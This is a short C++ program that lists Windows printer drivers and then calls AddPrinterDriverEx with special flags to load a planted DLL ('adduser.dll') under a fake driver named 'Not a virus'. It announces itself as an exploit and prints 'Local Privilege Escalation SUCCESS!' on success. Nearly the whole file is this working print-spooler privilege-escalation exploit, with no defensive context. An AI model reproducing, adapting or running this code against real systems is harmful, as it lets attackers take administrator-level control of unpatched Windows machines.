#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <winspool.h>


std::string GetLastErrorAsString()
{
    //Get the error message ID, if any.
    DWORD errorMessageID = ::GetLastError();
    if (errorMessageID == 0) {
        return std::string(); //No error message has been recorded
    }

    LPSTR messageBuffer = nullptr;

    size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);

    std::string message(messageBuffer, size);

    LocalFree(messageBuffer);

    return message;
}

int main()
{
    typedef struct _DRIVER_INFO_2 {
        DWORD  cVersion;
        LPTSTR pName;
        LPTSTR pEnvironment;
        LPTSTR pDriverPath;
        LPTSTR pDataFile;
        LPTSTR pConfigFile;
    } DRIVER_INFO_2, * PDRIVER_INFO_2;

    LPTSTR plateforme = const_cast <LPTSTR>("Windows x64");    
    DWORD dwNeeded;
    LPBYTE lpDriverInfo;
    DWORD dwReturned;
    DRIVER_INFO_2* pInfo;
    DWORD i;

    EnumPrinterDrivers(NULL,
        plateforme,
        2,
        NULL,
        0,
        &dwNeeded,
        &dwReturned);


    lpDriverInfo = new BYTE[dwNeeded];
    if (lpDriverInfo == NULL) {
        return NULL;
    }

    EnumPrinterDrivers(NULL,
        plateforme,
        2,
        lpDriverInfo,
        dwNeeded,
        &dwNeeded,
        &dwReturned);
            std::cout <<  GetLastErrorAsString();

    pInfo = (DRIVER_INFO_2*)lpDriverInfo;
    std::cout << "dwNeeded : ";
    std::cout << + dwNeeded;
    std::cout << "\ndwReturned : ";
    std::cout << dwReturned;
    std::cout << "\nsizeOf pInfo : ";
    std::cout << sizeof(lpDriverInfo);
    std::cout << "\nsizeOf _DRIVER_INFO_2 : ";
    std::cout <<  sizeof(_DRIVER_INFO_2);


    for (DWORD i = 0; i < dwReturned; i++)
    {
        std::cout << "\nDRIVER FOUND :\n";
        std::cout << "  pName : " << pInfo[i].pName << "\n";
        std::cout << "  pEnvironment : " << pInfo[i].pEnvironment << "\n";
        std::cout << "  pConfigFile : " << pInfo[i].pConfigFile << "\n";
        std::cout << "  pDriverPath : " << pInfo[i].pDriverPath << "\n";
        std::cout << "  cVersion : " << pInfo[i].cVersion << "\n";
        std::cout << "  cVersion : " << pInfo[i].pDataFile << "\n";

    }

    std::cout << "\nStarting exploit with AddPrinterDriverEx...\n";
    _DRIVER_INFO_2 badDriver;
    badDriver.cVersion = 3;
    badDriver.pConfigFile = const_cast < LPTSTR>("C:\\Users\\test\\adduser.dll");
    badDriver.pDataFile = const_cast < LPTSTR>("C:\\Users\\test\\adduser.dll");
    badDriver.pDriverPath = pInfo->pDriverPath;
    badDriver.pEnvironment = const_cast < LPTSTR>("Windows x64");
    badDriver.pName = const_cast < LPTSTR>("Not a virus");
    DWORD hr = AddPrinterDriverEx(NULL,2,(PBYTE)&badDriver,APD_COPY_ALL_FILES | 0x10 | 0x8000);

    if (hr == 1)
    {
        printf("[+] Local Privilege Escalation SUCCESS!\n");
    }
    else {
        printf("[-] AddPrinterDriverEx%d \n", hr);
    }
    std::cout << GetLastErrorAsString();

}
